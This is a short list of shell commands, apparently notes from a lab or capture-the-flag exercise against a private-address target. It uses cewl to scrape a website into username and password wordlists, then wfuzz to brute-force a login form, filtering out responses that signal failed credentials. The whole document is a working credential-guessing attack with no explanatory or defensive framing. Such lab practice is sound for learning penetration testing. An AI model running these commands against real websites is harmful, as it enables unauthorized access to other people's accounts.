MACHINE_IP=10.10.46.136

cewl -d 2 -m 5 -w passwords.txt http://$MACHINE_IP --with-numbers
cewl -d 0 -m 5 -w usernames.txt http://$MACHINE_IP/team.php --lowercase
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://$MACHINE_IP/login.php -d "username=FUZZ&password=FUZ2Z"
